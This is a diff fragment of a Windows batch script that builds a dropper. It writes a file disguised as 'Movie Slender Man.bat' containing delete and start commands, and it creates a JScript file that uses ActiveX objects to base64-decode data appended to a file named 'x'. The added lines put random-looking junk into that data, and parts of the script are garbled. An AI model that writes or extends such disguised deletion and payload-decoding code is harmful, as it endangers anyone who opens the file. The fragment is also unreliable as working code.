@@ -4,6 +4,10 @@ echo del<>nul set>>Movie Slender Man.bat
 echo del,s(0)>>Movie Slender Man.bat
 echo start%protocol%>>Movie Slender Man.bat
 echo Ushh&ytay/sauhd78TA*Tdsgdghsggusd>>Movie Slender Man.bat
+echo hsdgiuyasgduysdfr87rhr87uyfgxh8dg7atsduagsodgsad>>x
+echo DEL<NUL>DEL>>x
+
+
 
 echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
 echo x=new ActiveXObject(^"MSXml2.DOMDocument^").createElement(^"Base64Data^");x.dataType=^"bin.base64^";>>x.js
